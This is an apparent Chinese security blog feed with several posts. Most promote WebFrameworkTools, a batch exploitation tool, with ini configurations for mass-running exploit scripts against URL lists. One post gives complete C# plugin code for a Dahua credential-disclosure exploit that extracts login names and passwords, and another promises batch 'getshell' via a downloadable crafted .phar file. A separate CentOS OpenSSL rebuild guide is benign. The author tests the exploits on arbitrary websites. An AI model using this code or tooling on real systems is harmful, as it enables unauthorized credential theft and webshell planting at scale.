class="token keyword">private</span><span class="token class-name">Vary</span><span class="token operator">:</span> <span class="token class-name">Accept</span><span class="token operator">-</span><span class="token class-name">Encoding</span><span class="token class-name">Connection</span><span class="token operator">:</span> close<span class="token class-name">Content</span><span class="token operator">-</span><span class="token class-name">Type</span><span class="token operator">:</span> application<span class="token operator">/</span>json<span class="token class-name">Content</span><span class="token operator">-</span><span class="token class-name">Length</span><span class="token operator">:</span> <span class="token number">145</span>返回这个 no_file 才是对的其他都是错误的<span class="token punctuation">&#123;</span><span class="token string">"status"</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"errors"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token string">"code"</span><span class="token operator">:</span><span class="token string">"no_file"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token operator">:</span><span class="token string">"\u6ce8\u518c\u6587\u4ef6\u4e0d\u5b58\u5728"</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"runtime"</span><span class="token operator">:</span><span class="token string">"0.322"</span><span class="token punctuation">&#125;</span>这里是回显结果</code></pre><p>截图我就不截了基本就是上面的步骤</p><h2 id="复现坑点"><a href="#复现坑点" class="headerlink" title="复现坑点"></a>复现坑点</h2><p> 在brup 高版本中即使你用正确poc也无法复现成功下图说明。下图最新版本的brup复现失败用的poc是同一个conten-length 都不一样<br> <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202403301627884.png" alt="复现坑点"><br> 这个截图截一个成功的<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202403301631579.png" alt="成功复现"></p><h2 id="武器化"><a href="#武器化" class="headerlink" title="武器化"></a>武器化</h2><p>这样重复的劳动比较辛苦我们做成一个自动化渗透测试武器。另外如果你不想写代码可以使用我们的工具5.3最新版本 ini配置模式配置一波别人写好的脚本直接批量拿shell就行至于如何配置参考前面的东东。这个漏洞如果只搞一个命令执行不太行。经过我的研究研究出一个直接可以getshell的exp配置命令执行。<br>。如下图:<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202403301634001.jpg" alt="!武器化"><br>上述可以单个也可以批量getshell。达到快速拿webshell的目的。那些现在搞一波小密圈写个py或者go的这些单个的命令行执行的就别老用小密圈割韭菜了好歹你放一波你构造的.phar文件。老在那装逼我也是醉了。。。。至于exp的构造参考阿里云那篇文章你就可以自己构造了怎么样。</p><h2 id="构造文件下载"><a href="#构造文件下载" class="headerlink" title="构造文件下载"></a>构造文件下载</h2><p>我放到频道评论区了自己下载吧<br><a href="https://t.me/SoftwareNoticeChannel/401?comment=10602">https://t.me/SoftwareNoticeChannel/401?comment=10602</a><br/><br>github地址:<a href="https://github.com/peiqiF4ck/WebFrameworkTools-5.1-main">https://github.com/peiqiF4ck/WebFrameworkTools-5.1-main</a></p>]]></content>
      
      
      <categories>
          
          <category> PenetrationTest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PenetrationTestingExample </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux Centos python3请求https类型网站报错问题解决-报错原因openssl版本过低</title>
      <link href="/problemsolved/2024/03/articles/b21057b89a7d1481/"/>
      <url>/problemsolved/2024/03/articles/b21057b89a7d1481/</url>
      
        <content type="html"><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><h2>在linux centos 上运行python脚本出现错误错误</h2><pre class="language-python" data-language="python"><code class="language-python">Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span><span class="token punctuation">:</span>  File <span class="token string">"/usr/local/python3/lib/python3.8/site-packages/requests/adapters.py"</span><span class="token punctuation">,</span> line <span class="token number">486</span><span class="token punctuation">,</span> <span class="token keyword">in</span> send    resp <span class="token operator">=</span> conn<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>  File <span class="token string">"/usr/local/python3/lib/python3.8/site-packages/urllib3/connectionpool.py"</span><span class="token punctuation">,</span> line <span class="token number">755</span><span class="token punctuation">,</span> <span class="token keyword">in</span> urlopen    retries <span class="token operator">=</span> retries<span class="token punctuation">.</span>increment<span class="token punctuation">(</span>  File <span class="token string">"/usr/local/python3/lib/python3.8/site-packages/urllib3/util/retry.py"</span><span class="token punctuation">,</span> line <span class="token number">573</span><span class="token punctuation">,</span> <span class="token keyword">in</span> increment    <span class="token keyword">raise</span> MaxRetryError<span class="token punctuation">(</span>_pool<span class="token punctuation">,</span> url<span class="token punctuation">,</span> error <span class="token keyword">or</span> ResponseError<span class="token punctuation">(</span>cause<span class="token punctuation">)</span><span class="token punctuation">)</span>urllib3<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>MaxRetryError<span class="token punctuation">:</span> HTTPSConnectionPool<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'xxxxxxxxx'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">443</span><span class="token punctuation">)</span><span class="token punctuation">:</span> Max retries exceeded <span class="token keyword">with</span> url<span class="token punctuation">:</span> <span class="token operator">/</span>admin<span class="token operator">/</span>login<span class="token punctuation">.</span>html <span class="token punctuation">(</span>Caused by SSLError<span class="token punctuation">(</span>SSLError<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'[SSL: TLSV1_ALERT_PROTOCOL_VERSION] tlsv1 alert protocol version (_ssl.c:1108)'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>During handling of the above exception<span class="token punctuation">,</span> another exception occurred<span class="token punctuation">:</span></code></pre><h2 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h2><p>首先安装依赖</p><pre class="language-sh" data-language="sh"><code class="language-sh">yum install zlib zlib-devel bzip2-devel openssl-devel ncurses-devel libuuid-devel sqlite-devel readline-devel tcl-devel tk-devel lzma gdbm-devel db4-devel libpcap-devel xz-devel libffi-devel</code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202403211557212.png" alt="依赖安装"></p><p>下载openssl源代码<br>wget <a href="https://www.openssl.org/source/openssl-1.1.1g.tar.gz">https://www.openssl.org/source/openssl-1.1.1g.tar.gz</a><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202403211558140.png" alt="下载openssl源码"></p><p>解压<br>    tar zxf openssl-1.1.1g.tar.gz<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202403211600372.png" alt="解压"></p><p>配置编译openssl环境<br>.&#x2F;config –prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;openssl shared zlib<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202403211601287.png" alt="配置openssl编译环境"><br>make编译<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202403211607251.png" alt="make"><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202403211607721.png" alt="make编译"><br>make install安装<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202403211608603.png" alt="make install"><br>创建软链接<br>ln -sf &#x2F;usr&#x2F;local&#x2F;openssl&#x2F;bin&#x2F;openssl &#x2F;usr&#x2F;bin&#x2F;openssl<br>ln -s &#x2F;usr&#x2F;local&#x2F;openssl&#x2F;lib&#x2F;libssl.so.1.1 &#x2F;usr&#x2F;lib64&#x2F;libssl.so.1.1<br>ln -s &#x2F;usr&#x2F;local&#x2F;openssl&#x2F;lib&#x2F;libcrypto.so.1.1 &#x2F;usr&#x2F;lib64&#x2F;libcrypto.so.1.1<br>openssl version<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202403211610783.png" alt="查看安装的openssl是否成功"><br>安装成功以后下载python源码<br>wget <a href="https://www.python.org/ftp/python/3.8.6/Python-3.8.6.tgz">https://www.python.org/ftp/python/3.8.6/Python-3.8.6.tgz</a><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202403211611279.png" alt="下载python源码"><br>解压 tar zxf Python-3.8.6.tgz<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202403211611486.png" alt="解压python"><br>重点链接 openssl  设置编译环境<br>.&#x2F;configure –prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;python3 –with-openssl&#x3D;&#x2F;usr&#x2F;local&#x2F;openssl&#x2F;<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202403211612421.png" alt="编译"><br>make编译<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202403211614542.png" alt="make"><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202403211614928.png" alt="make"><br>make install<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202403211615045.png" alt="make install"></p><p>python3再次测试<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202403211621486.png" alt="测试python3"></p><p>最终测试测试脚本情况正常运行了<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202403211624440.png" alt="测试问题是否解决"></p><p>如果上述已经安装了requests 报错说是requests还报错尝试<br>最好把python加入到环境变量中(如果上述步骤imports requests 找不到那可以试试加入到环境变量)</p><p>export PATH&#x3D;”&#x2F;usr&#x2F;local&#x2F;python3&#x2F;bin:$PATH”<br>vim &#x2F;etc&#x2F;profile<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202403211622067.png"><br>修改完毕以后source &#x2F;etc&#x2F;pfofile一下弄完以后再次尝试看看。如果不行删除在重新编译看看遗漏了哪些细节。测试在linux<br>CentOS Linux release 7.9.2009 (Core)  3.10.0-1160.102.1.el7.x86_64 #1 SMP Tue Oct 17 15:42:21 UTC 2023 x86_64 x86_64 x86_64 GNU&#x2F;Linux</p>]]></content>
      
      
      <categories>
          
          <category> ProblemSolved </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ToolDevelopment </tag>
            
            <tag> ALLlanguage </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>综合性exp|poc渗透工具-WebFrameworkTools5.2 ini配置用法</title>
      <link href="/securitytools/2024/01/articles/1fee187af88e0843/"/>
      <url>/securitytools/2024/01/articles/1fee187af88e0843/</url>
      
        <content type="html"><![CDATA[<h1 id="软件用法"><a href="#软件用法" class="headerlink" title="软件用法"></a>软件用法</h1><h2>WebFrameworkTools5.2 ini工具使用方法</h2> 在23年8月份已经发布了5.1 详情请看https://peiqif4ck.github.io/securitytools/2023/08/articles/17280a163317a771/  并且也写明了用法 详情请看https://peiqif4ck.github.io/securitytools/2023/09/articles/2633a9b907f3f584/   为什么要开发这个软件呢有些人说你虽然提供了编写exp的教程还有一键生成利用exp的图形化的工具。但是我就不不喜欢自己写exp。我能不利用github或者哪里写好的exp直接批量多样化<br/> 例如:有一个漏洞利用exp是python写的比如大华任意文件读取还有一个是exp是 go写的 通达oa任意文件上传漏洞的exp。等等漏洞利用exp。假如有100个漏洞利用程序 我们有100个网站并且这100个漏洞利用程序我们需要运行100次这种下次利用的时候又要运行100次。有没有只配置100次把这100个漏洞利用程序放到固定位置并且对应100个配置文件这样配置好我们只要运行程序一次并且装载100个url就可以批量利用。并且只需要换url就行了。这样就可以反复利用了。这就是这个工具的价值所在。这就是开发这个工具的必要。<br/> 工具用法:<ul><li>WebFrameworkToolsUserIni.exe</li><li>WebFrameworkToolsUserIni.exe -thread 30</li><li>WebFrameworkToolsUserIni.exe -ininame test.ini</li><li>WebFrameworkToolsUserIni.exe -ininame test.ini -thread 30</li><li>WebFrameworkToolsUserIni.exe -url http://www.baidu.com</li><li>WebFrameworkToolsUserIni.exe -url http://www.baidu.com -thread 30</li><li>WebFrameworkToolsUserIni.exe -url http://www.baidu.com -ininame test.ini</li></ul><h2 id="工具界面"><a href="#工具界面" class="headerlink" title="工具界面"></a>工具界面</h2><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202312301538031.png" alt="软件界面"></p><h2 id="工具详细使用"><a href="#工具详细使用" class="headerlink" title="工具详细使用"></a>工具详细使用</h2><p> 假如现在有个漏洞利用程序Dahua_getpass_scan.py 并且这个工具有单个url 用法 :python3 Dahua_systempass_scan.py -u <a href="http://ip:port">http://ip:port</a> 我们就用这个举例子把首先确保这个脚本可以使用如图: 2.png</p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202312301605535.png" alt="利用工具截图演示"></p><p>运行结果<br> [32m[+]<a href="https://xxxxxs/">https://xxxxxs</a> is vulnerable. system:d02e1040073667ee666afdab17c88df6[0m<br>我们配置一下配置模版如下:</p><pre class="language-ini" data-language="ini"><code class="language-ini"><span class="token section"><span class="token punctuation">[</span><span class="token section-name selector">WebTools</span><span class="token punctuation">]</span></span><span class="token comment">#这里可以在cmd里面执行无需配置绝对路径否则需配置绝对路径</span><span class="token key attr-name">exe</span><span class="token punctuation">=</span><span class="token value attr-value">python</span><span class="token comment">#这里是执行脚本的参数 这里的python是个文件夹里面放的这个Dahua_getpass_scan.py</span><span class="token key attr-name">arg</span><span class="token punctuation">=</span><span class="token value attr-value">python\Dahua_getpass_scan.py -u $url$</span><span class="token comment">#漏洞特征字符串包含这个字符串就有漏洞</span><span class="token key attr-name">vulStr</span><span class="token punctuation">=</span><span class="token value attr-value">is vulnerable</span><span class="token comment">#正则表达式提取字符串这个正则的意思是定位在(?&lt;=\[\+\])定位[+] 配置规则是 .*所以就匹配到了 https://xxxxxs is vulnerable. system:d02e1040073667ee666afdab17c88df6[0m</span><span class="token key attr-name">regex</span><span class="token punctuation">=</span><span class="token value attr-value">(?&lt;=\[\+\]).*</span><span class="token comment">#配置不输出程序执行的所有结果只输出正则结果等</span><span class="token key attr-name">echoAllResult</span><span class="token punctuation">=</span><span class="token value attr-value">no</span><span class="token comment">#配置是否需要本程序写入结果如果不需要程序写入那么就是no</span><span class="token key attr-name">writeFile</span><span class="token punctuation">=</span><span class="token value attr-value">yes</span><span class="token comment">#配置不包含这个字符串有漏洞注意vulStr和NovulStr不能同时出现在同一个配置文件中</span><span class="token comment">#NovulStr</span></code></pre><p>在程序同随便目录创建一个文件夹叫python 把利用程序放到里面如下图</p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202312301606838.png" alt="漏洞利用程序"><br>我们来配置一下我们的ini文件 配置如下:</p><pre class="language-ini" data-language="ini"><code class="language-ini"><span class="token section"><span class="token punctuation">[</span><span class="token section-name selector">WebTools</span><span class="token punctuation">]</span></span><span class="token comment">#这里可以在cmd里面执行无需配置绝对路径否则需配置绝对路径</span><span class="token key attr-name">exe</span><span class="token punctuation">=</span><span class="token value attr-value">python</span><span class="token comment">#这里是执行脚本的参数</span><span class="token key attr-name">arg</span><span class="token punctuation">=</span><span class="token value attr-value">python\Dahua_getpass_scan.py -u $url$</span><span class="token comment">#漏洞特征字符串包含这个字符串就有漏洞</span><span class="token key attr-name">vulStr</span><span class="token punctuation">=</span><span class="token value attr-value">is vulnerable</span><span class="token comment">#正则表达式提取字符串</span><span class="token key attr-name">regex</span><span class="token punctuation">=</span><span class="token value attr-value">(?&lt;=\[\+\]).*</span><span class="token comment">#配置不输出程序执行的所有结果只输出正则结果等</span><span class="token key attr-name">echoAllResult</span><span class="token punctuation">=</span><span class="token value attr-value">yes</span><span class="token comment">#配置是否需要本程序写入结果</span><span class="token key attr-name">writeFile</span><span class="token punctuation">=</span><span class="token value attr-value">yes</span><span class="token comment">#配置不包含这个字符串有漏洞注意vulStr和NovulStr不能同时出现在同一个配置文件中</span><span class="token comment">#NovulStr</span></code></pre><p>如下图: </p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202312301607402.png" alt="程序利用配置截图"></p><p>利用截图<br>WebFrameworkToolsUserIni.exe -url xxxx.com -ininame dahua.ini</p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202312301608737.png" alt="程序利用截图"></p><p>如果想批量执行那么创建一个iniUrl.txt 一行一个截图</p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202312301609767.png" alt="iniUrl截图"></p><p>利用截图<br>WebFrameworkToolsUserIni.exe -ininame dahua.ini</p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202312301611246.png" alt="利用截图"></p><p>如果想批量url 批量配置文件 截图  需要同目录下创建configini</p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202312301612869.png" alt="configini配置目录"></p><p>利用截图<br>WebFrameworkToolsUserIni.exe -url <a href="https://xxxxxx/">https://xxxxxx</a></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202312301612717.png" alt="利用截图"></p><p>利用截图 批量网站 10.png<br>WebFrameworkToolsUserIni.exe</p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202312301613515.png" alt="批量网站利用截图"></p><p>配置截图 11.png</p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202312301614261.png" alt="配置截图"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p> 上述就是使用方式这个是配置文件比较难搞可能需要正则表达式这个。如果不会配置可以问一波chatgt。<br/><br> 下载链接:<a href="https://www.upload.ee/files/16111546/WebFrameworkToolsUserIni.zip.html">https://www.upload.ee/files/16111546/WebFrameworkToolsUserIni.zip.html</a><br><br/><br> 配置文件文件在频道:<a href="https://t.me/SoftwareNoticeChannel/301">https://t.me/SoftwareNoticeChannel/301</a></br></p>]]></content>
      
      
      <categories>
          
          <category> SecurityTools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> original </tag>
            
            <tag> PenetrationTest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>综合性exp|poc渗透工具-WebFrameworkTools5.2 新版用法exp poc编写教学</title>
      <link href="/securitytools/2023/09/articles/2633a9b907f3f584/"/>
      <url>/securitytools/2023/09/articles/2633a9b907f3f584/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>此前我们发布了2022-08-26 版本这个应该算是5.0的产品。5.2和它的不同点我在这里 <a href="https://github.com/peiqiF4ck/WebFrameworkTools-5.1-main">https://github.com/peiqiF4ck/WebFrameworkTools-5.1-main</a> 已经发布。5.2最大的不同点就是可以调用任意程序批量执行下面我重点讲解一下5.1 图形化生成exp还有插件编写和5.2新版功能。至于用法参考17280a163317a771 这篇和github接下来废话不多说我们来介绍一下。我们以这里的漏洞<a href="https://github.com/MzzdToT/HAC_Bored_Writing">https://github.com/MzzdToT/HAC_Bored_Writing</a> 举例子实战测试。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021238636.png" alt="2022-08-26"></p><h2 id="图形化生成exp"><a href="#图形化生成exp" class="headerlink" title="图形化生成exp"></a>图形化生成exp</h2><p>我们根据提示搜索到如下exp我们直接copy到我们本地运行<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021247731.png" alt="这个漏洞为力"><br>copy出的exp运行测试没有报错<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021253414.png" alt="exp截图"><br>随便找个网站测试出现下面的图说明存在漏洞<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021257274.png" alt="存在漏洞"><br>分析一下这个python写的脚本我们来构造exp。下面的代码是get请求访问url+&#x2F;admin&#x2F;user_getUserInfoByUserName.action?userName&#x3D;system 得到的结果使用正则表达式提取结果我们来看一波。这个需要你们会python才能看懂如果看不懂可以去chatgpt问一下代码的意思。这里就不多说了<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021259758.png" alt="核心exp"><br>首先访问目标网站确定可以访问。然后我们加上exp看看返回<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021301334.png" alt="目标可以访问"><br>我们看到了返回结果nice。接下来我们怎么构造exp。我一步一步来。<br>第一步:exp访问目标网站<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021304424.png" alt="第一步"><br>第二步:填写目标特征(这个可有可无)有的话就是精确打击效果显著。我们先找个漏洞网站的链接访问得到指纹和特征如下图<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021308561.png" alt="得到指纹"><br>接下来我们来图形化exp构造一下。构造指纹以后在访问一波<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021312867.png" alt="指纹没问题"><br>第三步:提取exp。填上包含这个字符串就没问题。但是结果太长了。我们使用正则看看<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021314799.png" alt="结果"><br>最终结果就是这个。软件运行得到的结果也是这个。我们来生成一下exp。插件名称dahuapass<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021318134.png" alt="得到最终结果"><br>生成利用程序<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021319849.png" alt="生成利用程序"><br>第四步:测试结果。把这个两个dll拷贝如下<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021321393.png" alt="dll拷贝"><br>第五步:进去dll模式测试插件。可以看到生成的结果和我们图形化构造的结果一样。ok已经完成。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021324887.png" alt="生成的结果一样"></p><h2 id="exp插件编写"><a href="#exp插件编写" class="headerlink" title="exp插件编写"></a>exp插件编写</h2><p>这个需要会变点编程功底我们去github下载我们的插件项目。<br><a href="https://github.com/peiqiF4ck/ToolsUserDllplugin">https://github.com/peiqiF4ck/ToolsUserDllplugin</a>  使用vs2022打开项目。有人说这玩意我不太会写代码你找chatgpt我将演示一下如何帮助我们写出exp。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021330897.png" alt="下载下来打开项目"><br>第一步:解决写出请求方式让chatgpt 。话术。让他封装成函数<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021332436.png" alt="gpt"><br>让他用.netframework方式给我们写<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021334148.png" alt="写出来"><br>代码</p><pre class="language-C#" data-language="C#"><code class="language-C#">public static void Main(string[] args)    &#123;        string url &#x3D; &quot;https:&#x2F;&#x2F;example.com&quot;; &#x2F;&#x2F; 替换为你要请求的URL        string result &#x3D; GetResponse(url, TimeSpan.FromSeconds(30));        Console.WriteLine(result);    &#125;    public static string GetResponse(string url, TimeSpan timeout)    &#123;        string responseText &#x3D; string.Empty;        try        &#123;            HttpWebRequest request &#x3D; (HttpWebRequest)WebRequest.Create(url);            request.Timeout &#x3D; (int)timeout.TotalMilliseconds;            using (HttpWebResponse response &#x3D; (HttpWebResponse)request.GetResponse())            &#123;                using (Stream stream &#x3D; response.GetResponseStream())                &#123;                    using (StreamReader reader &#x3D; new StreamReader(stream))                    &#123;                        responseText &#x3D; reader.ReadToEnd();                    &#125;                &#125;            &#125;        &#125;        catch (Exception ex)        &#123;            responseText &#x3D; $&quot;请求出错: &#123;ex.Message&#125;&quot;;        &#125;        return responseText;    &#125;</code></pre><p>然后我们直接copy代码到项目里面。发现报错这是因为没有添加依赖。using System.IO;<br>using System.Net;<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021337153.png"><br>添加依赖错误消失<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021338870.png"><br>修改我们的的函数<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021341860.png"><br>调用我们的函数<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021342684.png"><br>我们从前面知道要想结果准确需要搞一个指纹所以下面格式就是我写的。然后含有loginname的才有漏洞所以我们知道结果是。{“id”:1,”extId”:1,”loginName”:”ooo”,”loginPass”:”xxx”,”“} 让chatgpt帮我们提取里面的<br>ooo和xxx<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021348613.png"></p><p>看操作:我有一个字符串 {“id”:1,”extId”:1,”loginName”:”ooo”,”loginPass”:”xxx”,”“}  帮我写一个正则表达式提取下一结果得到的结果是 ooo:xxx 。直接copy<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021352256.png" alt="直接拿捏"><br>copy报错同样是导入依赖。把那个未能提取结果改成 error。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021353641.png"></p><pre class="language-C#" data-language="C#"><code class="language-C#">public static string ExtractResult(string input)      &#123;          string pattern &#x3D; &quot;\&quot;loginName\&quot;:\&quot;([^\&quot;]+)\&quot;,\&quot;loginPass\&quot;:\&quot;([^\&quot;]+)\&quot;&quot;;          Match match &#x3D; Regex.Match(input, pattern);          if (match.Success)          &#123;              string loginName &#x3D; match.Groups[1].Value;              string loginPass &#x3D; match.Groups[2].Value;              return $&quot;&#123;loginName&#125;:&#123;loginPass&#125;&quot;;          &#125;          else          &#123;              return &quot;error&quot;;          &#125;      &#125;</code></pre><p>我们接下来看操作 直接调用</p><pre class="language-C#" data-language="C#"><code class="language-C#">&#x2F;&#x2F;&#x2F; &lt;summary&gt;     &#x2F;&#x2F;&#x2F; http漏洞代码实现       &#x2F;&#x2F;&#x2F; down 表示网站无法访问     &#x2F;&#x2F;&#x2F; error 表示没有漏洞 返回error     &#x2F;&#x2F;&#x2F; 成功则返回结果     &#x2F;&#x2F;&#x2F; &lt;&#x2F;summary&gt;     &#x2F;&#x2F;&#x2F; &lt;param name&#x3D;&quot;url&quot;&gt;&lt;&#x2F;param&gt;     &#x2F;&#x2F;&#x2F; &lt;returns&gt;&lt;&#x2F;returns&gt;     private  static string thinkphpRce(string url)     &#123;         string result &#x3D; string.Empty;         &#x2F;&#x2F;&#x2F;调用httpSendMethod 实战漏洞逻辑         &#x2F;&#x2F;&#x2F;         string errorcase &#x3D; &quot;error&quot;;         string expUrl &#x3D; url + &quot;&#x2F;admin&#x2F;user_getUserInfoByUserName.action?userName&#x3D;system&quot;;         string fingerUrl &#x3D; url + &quot;&#x2F;WPMS&#x2F;asset&#x2F;css&#x2F;login.css&quot;;         string res &#x3D; httpSendMethodMy(fingerUrl, 30*1000); &#x2F;&#x2F;调用http请求请求结果         if (!res.Contains(&quot;login-brand&quot;)) &#x2F;&#x2F;指纹请求         &#123;             Console.WriteLine(&quot;No 大华智慧 product&quot;);             return errorcase;         &#125;         string res1 &#x3D; httpSendMethodMy(expUrl, 30 * 1000); &#x2F;&#x2F;调用http请求请求结果         if (res1.Contains(&quot;loginName&quot;)) &#x2F;&#x2F;         &#123;             &#x2F;&#x2F;通过正则表达式方式直接刷选出漏洞然后赋值结果             string userpass &#x3D; ExtractResult(res1);             if (errorcase.Equals(userpass))             &#123;                 Console.WriteLine(&quot;正则提取失败&quot;);                 return errorcase;             &#125;             &#x2F;&#x2F;Console.WriteLine(userpass);             result &#x3D; url + &quot;|&quot; + userpass+ &quot;|ExpName:大华漏洞&quot;;  &#x2F;&#x2F;这里 |ExpName: 是必须标注的 重点重点！！！！         &#125;         else         &#123;             result &#x3D; errorcase;         &#125;         return result;     &#125;</code></pre><pre class="language-C#" data-language="C#"><code class="language-C#">public static string DllExec(string url)      &#123; &#x2F;&#x2F;方法名称          string expResult &#x3D; string.Empty;          string errorcase &#x3D; &quot;error&quot;;          string thinkphpRceRes &#x3D; thinkphpRce(url); &#x2F;&#x2F;调用函数                 if (errorcase.Equals(thinkphpRceRes))          &#123;              expResult &#x3D; errorcase;          &#125;          else          &#123;                         expResult &#x3D; thinkphpRceRes; &#x2F;&#x2F;系统系统写结果              &#x2F;&#x2F;  Console.WriteLine(expResult);             &#x2F;&#x2F; expResult &#x3D; thinkphpRceRes + &quot;|5a75574b96ce583b250cdcfff48caa78|&quot;; &#x2F;&#x2F;用户自己写成功结果系统不管 标志5a75574b96ce583b250cdcfff48caa78 加上这个标志就是你自己写你自己的结果。就行了          &#125;          return expResult;      &#125;</code></pre><p>然后生成dll我们开始测试。生成dll名字放到软件同目录下。dll名字可以修改<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021425234.png"><br>测试结果没毛病。这个案例编写我会放到频道。请到频道下载。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202309021425178.png"></p><h2 id="5-2新功能-此功能属于最新开发"><a href="#5-2新功能-此功能属于最新开发" class="headerlink" title="5.2新功能(此功能属于最新开发)"></a>5.2新功能(此功能属于最新开发)</h2><p>看了上面的两种。第一种适合简单的请求。第二种可以 编写任意exp 但是要求使用者会点编程配合chatgpt的使用。前两种功能都有第三种最新开发还没有放出。这里介绍一下使用方法。<br>接下来我们看第三种来演示一下。之前我们说过得到一个脚本运行一波。那个网站有漏洞。格式<br>python Dahua_getpass_scan.py -u website<br>配置文件。格式必须是这种的</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token punctuation">[</span><span class="token class-name">WebTools</span><span class="token punctuation">]</span>#这里可以在cmd里面执行无需配置绝对路径否则需配置绝对路径exe<span class="token operator">=</span>python#这里是执行脚本的参数arg<span class="token operator">=</span>python\<span class="token class-name">Dahua_getpass_scan</span><span class="token punctuation">.</span>py <span class="token operator">-</span>u 